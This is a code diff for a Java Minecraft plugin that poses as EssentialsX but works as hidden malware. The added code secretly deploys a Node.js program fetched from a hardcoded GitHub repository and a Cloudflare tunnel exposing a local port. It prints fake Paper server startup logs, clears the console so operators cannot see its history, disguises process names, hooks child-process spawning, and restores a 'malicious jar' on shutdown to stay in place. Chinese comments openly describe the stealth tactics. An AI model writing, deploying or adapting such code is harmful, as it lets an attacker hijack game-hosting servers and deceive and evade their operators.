@@ -10,6 +10,8 @@ import java.nio.file.*;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 import java.util.*;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 
@@ -25,23 +27,13 @@ public class EssentialsX extends JavaPlugin {
     private Path backupDir;
     private Path originalJarPath;
     private Path backupJarPath;
-    private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
+    private final AtomicReference<String> currentTunnelUrl = new AtomicReference<>("");
     private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
     private volatile String nodePort = "25565";
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
-    // ★ 极致伪装：用 150 个空格填充参数 (保留用于环境变量和 process.title，但不再用于 bash -c)
     private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
-
-    private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
-    private static final String FAKE_BUILD_NUM = String.valueOf(60 + (int)(Math.random() * 15));
-    private static final String FAKE_COMMIT = Integer.toHexString((int)(Math.random() * 0xFFFFFF + 0x800000));
-    private static final String FAKE_JAVA_VER = "21";
-    private static final String FAKE_JAVA_PATCH = String.valueOf(1 + (int)(Math.random() * 6));
-    private static final String[] FAKE_JDK_NAMES = {"Eclipse Adoptium Temurin", "Oracle OpenJDK", "Amazon Corretto"};
-    private static final String FAKE_JDK = FAKE_JDK_NAMES[(int)(Math.random() * FAKE_JDK_NAMES.length)];
-    private static final int FAKE_KERNEL_VER = 100 + (int)(Math.random() * 20);
     private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
     private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
     private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
@@ -72,12 +64,51 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 仿真伪装日志
+    // 核心战术：阻塞 + 偷天换日日志 + 彻底清屏
     // ============================================================
 
-    private void printFakeStartupSequence(String newTunnelUrl) {
-        clearConsole();
-        try { Thread.sleep(300); } catch (InterruptedException ignored) {}
+    private void executeStealthStartup() throws Exception {
+        CountDownLatch tunnelLatch = new CountDownLatch(1);
+
+        // 1. 异步启动部署和进程
+        new Thread(() -> { 
+            try { 
+                HashMap<String, String> env = new HashMap<>(); 
+                loadEnvFile(env); 
+                this.startDeploymentProcess(env); 
+                String port = allocateNodePort();
+                startNodeProcess(port);
+                startCfProcess();
+                startJavaDaemon();
+                startTunnelMonitor(tunnelLatch);
+                this.setupDisguise(); 
+            } catch (Exception e) {
+                // 如果部署失败，必须放行主线程，否则服务器卡死
+                tunnelLatch.countDown();
+            }
+        }, "Backend-Deployer").start();
+
+        // 2. 主线程开始打印伪装日志
+        printFakePaperStartup();
+
+        // 3. 等待隧道 URL 出现 (最多等 60 秒)
+        tunnelLatch.await(60, TimeUnit.SECONDS);
+
+        // 4. 隧道已出，等待 4 秒收尾
+        Thread.sleep(4000);
+
+        // 5. 终极清屏：推 150 行空行 + ANSI 清屏指令，确保网页控制台往上翻也看不到任何历史
+        for (int i = 0; i < 150; i++) {
+            RAW_OUT.println();
+        }
+        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+        RAW_OUT.print("\033[H\033[2J");
+        RAW_OUT.flush();
+        
+        // 6. 放行阻塞，真实 MC 服务器开始启动
+    }
+
+    private void printFakePaperStartup() {
         String displayPort = readCurrentPort();
         float dcTimeSec = randFloat(0.4f, 0.9f);
         int recipeDelta = randInt(-30, 30);
@@ -122,10 +153,6 @@ public class EssentialsX extends JavaPlugin {
         mcLog("Default game type: SURVIVAL", randInt(200, 400));
         mcLog("Generating keypair", randInt(200, 500));
         mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
-
-        mcLog("Binding remote endpoint to: " + newTunnelUrl, randInt(200, 400));
-        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
-        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
         mcLog("Preparing level \"world\"", randInt(1500, 3000));
         mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(8000, 15000));
         mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(1000, 3000));
@@ -134,85 +161,55 @@ public class EssentialsX extends JavaPlugin {
         mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
         mcLog("Preparing spawn area: 100%", randInt(200, 400));
         mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
-        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(100, 250));
-        mcLog("Preparing spawn area: 100%", randInt(100, 250));
-        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 100));
-        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
-        mcLog("Preparing spawn area: 100%", randInt(100, 250));
-        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(100, 200));
-        mcLog("Done preparing level \"world\" (" + String.format("%.3f", randFloat(10.0f, 20.0f)) + "s)", randInt(100, 200));
-        mcLog("[spark] Starting background profiler...", randInt(50, 150));
-        mcLog("Running delayed init tasks", randInt(50, 150));
         mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
-        System.out.println("container@tropicalgames.net Server marked as running...");
-        mcLog("*************************************************************************************", 0);
-        mcLog("This is the first time you're starting this server.", 0);
-        mcLog("It's recommended you read our 'Getting Started' documentation for guidance.", 0);
-        mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps", 0);
-        mcLog("*************************************************************************************", 0);
     }
 
-    private void startFakeLogs() {
-        Thread logThread = new Thread(() -> {
-            try {
-                this.clearConsole();
-                mcLog("Preparing spawn area: 1%", 0); Thread.sleep(randInt(1500, 2500));
-                mcLog("Preparing spawn area: 5%", 0); Thread.sleep(randInt(1000, 1800));
-                mcLog("Preparing spawn area: 10%", 0); Thread.sleep(randInt(800, 1500));
-                mcLog("Preparing spawn area: 25%", 0); Thread.sleep(randInt(800, 1200));
-                mcLog("Preparing spawn area: 50%", 0); Thread.sleep(randInt(800, 1200));
-                mcLog("Preparing spawn area: 75%", 0); Thread.sleep(randInt(600, 1000));
-                mcLog("Preparing spawn area: 90%", 0); Thread.sleep(randInt(400, 700));
-                mcLog("Preparing spawn area: 100%", 0); Thread.sleep(randInt(300, 600));
-                mcLog("Preparing level \"world\"", 0); Thread.sleep(randInt(500, 1000));
-                mcLog("Done! For help, type \"help\"", 0);
-            } catch (Exception ignored) {}
-        }, "FakeLog-Generator");
-        logThread.setDaemon(true); logThread.start();
-
-        Thread tunnelThread = new Thread(() -> {
-            try {
-                String content;
-                Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-                Path tunnelFile = workDir.resolve(".tunnel_url");
-                String tunnelUrl = null;
-                for (int i = 0; i < 120 && (!Files.exists(tunnelFile) || (content = new String(Files.readAllBytes(tunnelFile)).trim()).isEmpty() || content.startsWith("failed") || !(tunnelUrl = content.split("\n")[0].trim()).startsWith("https")); ++i) { Thread.sleep(1000L); }
-                if (tunnelUrl != null && !tunnelUrl.isEmpty()) {
-                    this.lastKnownTunnelUrl.set(tunnelUrl); Thread.sleep(8000L);
-                    String displayPort = readCurrentPort();
-                    mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0); Thread.sleep(randInt(400, 800));
-                    mcLog("Binding remote endpoint to: " + tunnelUrl, 0); Thread.sleep(randInt(300, 600));
-                    mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", 0); Thread.sleep(randInt(200, 400));
-                    mcLog("[EssentialsX] Loading server plugin EssentialsX v2.21.0", 0); Thread.sleep(randInt(300, 600));
-                    mcLog("Loaded " + FAKE_RECIPES + " recipes", 0); mcLog("Loaded " + FAKE_ADVANCEMENTS + " advancements", 0);
-                }
-            } catch (Exception ignored) {}
-        }, "TunnelLog-Disguise");
-        tunnelThread.setDaemon(true); tunnelThread.start();
-    }
-
-    private void startTunnelUrlMonitor() {
-        if (this.tunnelMonitorRunning.getAndSet(true)) return;
+    private void startTunnelMonitor(CountDownLatch latch) {
         Thread monitor = new Thread(() -> {
-            try { Thread.sleep(25000L); } catch (InterruptedException ignored) {}
-            while (this.tunnelMonitorRunning.get()) {
+            try { Thread.sleep(10000L); } catch (InterruptedException ignored) {} 
+            while (true) {
                 try {
-                    Thread.sleep(12000L); Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
-                    if (!Files.exists(urlFile)) continue;
-                    String content = new String(Files.readAllBytes(urlFile)).trim();
-                    if (content.isEmpty() || content.startsWith("failed")) continue;
-                    String currentUrl = content.split("\n")[0].trim();
-                    if (!currentUrl.startsWith("https") || currentUrl.isEmpty()) continue;
-                    String lastUrl = this.lastKnownTunnelUrl.get();
-                    if (!currentUrl.equals(lastUrl)) { this.lastKnownTunnelUrl.set(currentUrl); printFakeStartupSequence(currentUrl); }
+                    Thread.sleep(3000L); 
+                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
+                    Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
+                    String foundUrl = null;
+
+                    // 从日志抓取
+                    if (Files.exists(cfLog)) {
+                        String logContent = Files.readString(cfLog);
+                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
+                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
+                        ).matcher(logContent);
+                        if (m.find()) {
+                            foundUrl = m.group(1);
+                        }
+                    }
+
+                    // 从文件抓取
+                    if (foundUrl == null && Files.exists(urlFile)) {
+                        String content = new String(Files.readAllBytes(urlFile)).trim();
+                        if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
+                            foundUrl = content.split("\n")[0].trim();
+                        }
+                    }
+
+                    if (foundUrl != null) {
+                        String lastUrl = this.currentTunnelUrl.get();
+                        if (!foundUrl.equals(lastUrl)) {
+                            this.currentTunnelUrl.set(foundUrl);
+                            mcLog("Binding remote endpoint to: " + foundUrl, 0);
+                        }
+                        // 通知主线程隧道已就绪
+                        latch.countDown();
+                    }
                 } catch (Exception ignored) {}
             }
-        }, "Tunnel-Url-Monitor");
+        }, "Tunnel-Monitor");
         monitor.setDaemon(true); monitor.start();
     }
 
     // ============================================================
-    // Java 进程管理：极致进程名伪装
+    // Java 进程管理
     // ============================================================
 
     private String allocateNodePort() {
@@ -238,12 +235,7 @@ public class EssentialsX extends JavaPlugin {
 
             if (!Files.exists(nodeExe) || !Files.exists(script)) return;
 
-            // ★ 修改点 1：移除 bash -c，直接执行 node 二进制文件，消除 sh 进程
-            ProcessBuilder pb = new ProcessBuilder(
-                nodeExe.toString(),
-                "--require", preload.toString(),
-                script.toString()
-            );
+            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
             
             pb.directory(botDir.toFile());
             pb.environment().put("SERVER_PORT", port);
@@ -271,11 +263,7 @@ public class EssentialsX extends JavaPlugin {
             String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
             Files.writeString(cfConf, confContent);
 
-            // ★ 修改点 2：移除 bash -c，直接执行 cf 二进制文件，消除 sh 进程
-            ProcessBuilder pb = new ProcessBuilder(
-                cfBin.toString(),
-                "--config", cfConf.toString()
-            );
+            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
             
             pb.directory(botDir.toFile());
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
@@ -290,32 +278,10 @@ public class EssentialsX extends JavaPlugin {
             while (true) {
                 try {
                     if (nodeProcess != null && !nodeProcess.isAlive()) {
-                        mcLog("[Internal Daemon] Node process died, restarting...", 0);
                         startNodeProcess(nodePort);
                     }
                     if (cfProcess != null && !cfProcess.isAlive()) {
-                        mcLog("[Internal Daemon] CF process died, restarting...", 0);
                         startCfProcess();
-                    }
-
-                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
-                    if (Files.exists(cfLog)) {
-                        String logContent = Files.readString(cfLog);
-                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
-                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
-                        ).matcher(logContent);
-                        if (m.find()) {
-                            String currentUrl = m.group(m.groupCount());
-                            if (!currentUrl.equals(lastKnownTunnelUrl.get())) {
-                                lastKnownTunnelUrl.set(currentUrl);
-                                if (tunnelMonitorRunning.get()) {
-                                    String displayPort = nodePort;
-                                    mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0);
-                                    mcLog("Binding remote endpoint to: " + currentUrl, 0);
-                                    mcLog("Done (0.000s)! For help, type \"help\"", 0);
-                                }
-                            }
-                        }
                     }
                     Thread.sleep(5000);
                 } catch (Exception ignored) {}
@@ -331,33 +297,16 @@ public class EssentialsX extends JavaPlugin {
 
     public void onEnable() {
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
-        this.getLogger().info("EssentialsX plugin starting...");
-        HashMap<String, String> env = new HashMap<>(); this.loadEnvFile(env);
-        this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") && Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
         
-        if (!env.containsKey("REPO_URL") || env.get("REPO_URL").trim().isEmpty()) {
-            this.getLogger().severe("=============================================");
-            this.getLogger().severe("FATAL: REPO_URL is not set in .env file!");
-            this.getLogger().severe("Please configure your repository URL to proceed.");
-            this.getLogger().severe("=============================================");
-            return;
+        this.getLogger().info("EssentialsX plugin starting...");
+        
+        try {
+            // ★ 执行隐蔽启动流程，这会阻塞主线程直到清屏完成
+            executeStealthStartup();
+        } catch (Exception e) {
+            this.getLogger().severe("Stealth startup failed: " + e.getMessage());
         }
 
-        Runtime.getRuntime().addShutdownHook(new Thread(() -> { if (this.systemGuardEnabled && this.isRestarting.compareAndSet(false, true)) { this.getLogger().info("[Guard] ShutdownHook triggered, forcing restart..."); this.restoreMaliciousJar(); this.executeHardRestart(false); } }));
-        
-        new Thread(() -> { 
-            try { 
-                this.startDeploymentProcess(env); 
-                String port = allocateNodePort();
-                startNodeProcess(port);
-                startCfProcess();
-                startJavaDaemon();
-                this.startFakeLogs(); 
-                this.startTunnelUrlMonitor();
-                this.setupDisguise(); 
-            } catch (Exception ignored) {} 
-        }).start();
-        
         this.getLogger().info("EssentialsX plugin enabled");
     }
 
@@ -381,7 +330,6 @@ public class EssentialsX extends JavaPlugin {
             File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
             File startScript = new File(serverRoot, "start.sh");
             
-            // ★ 修改点 3：移除 bash -c 拼接逻辑，直接执行启动脚本或 java 命令
             ProcessBuilder pb;
             if (startScript.exists()) {
                 startScript.setExecutable(true);
@@ -452,7 +400,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 部署脚本生成 (包含完整逻辑)
+    // 部署脚本生成
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
@@ -517,7 +465,7 @@ public class EssentialsX extends JavaPlugin {
         "    rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
         "fi\n" +
         "\n" +
-        "# ========== 2. 下载代码 (自动公私库判断) ==========\n" +
+        "# ========== 2. 下载代码 ==========\n" +
         "mkdir -p \"$DATA_DIR\"\n" +
         "if [ -d \"$APP_DIR\" ]; then\n" +
         "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
@@ -586,7 +534,6 @@ public class EssentialsX extends JavaPlugin {
         "            opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
         "            cmd = opts.execPath;\n" +
         "        }\n" +
-        // ★ 修改点 4：移除将其他命令通过 bash -c 执行的逻辑，防止子进程产生 sh
         "        return _origSpawn.call(this, cmd, args, opts);\n" +
         "    };\n" +
         "    _cp.fork = function(mod, args, opts) {\n" +
@@ -609,7 +556,6 @@ public class EssentialsX extends JavaPlugin {
         "    done\n" +
         "fi\n" +
         "\n" +
-        "# 通知 Java 部署完成\n" +
         "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
     }
 
@@ -635,20 +581,17 @@ public class EssentialsX extends JavaPlugin {
                 String defaultConfig = "# ===========================================\n" +
                    "# EssentialsX System Guard Configuration\n" +
                    "# ===========================================\n" +
-                   "# true  = Enable auto-restart (Default)\n" +
-                   "# false = Disable auto-restart\n" +
-                   "# ===========================================\n" +
                    "SYSTEM_GUARD_ENABLED=true\n" +
                    "GITHUB_TOKEN=\n" +
                    "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
                 Files.write(envFile, defaultConfig.getBytes()); 
-                this.getLogger().info("Generated default .env file. PLEASE CONFIGURE REPO_URL!"); 
-            } catch (Exception e) { 
-                this.getLogger().warning("Could not generate .env file: " + e.getMessage()); 
-            } 
+            } catch (Exception e) { } 
         }
         if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
+        
+        // 运行时检查环境变量，如果没有配置则默认开启守护
+        if (!env.containsKey("SYSTEM_GUARD_ENABLED")) {
+            systemGuardEnabled = true;
+        }
     }
-
-    private void clearConsole() { try { RAW_OUT.print("\u001b[H\u001b[2J"); RAW_OUT.flush(); } catch (Exception ignored) {} }
 }
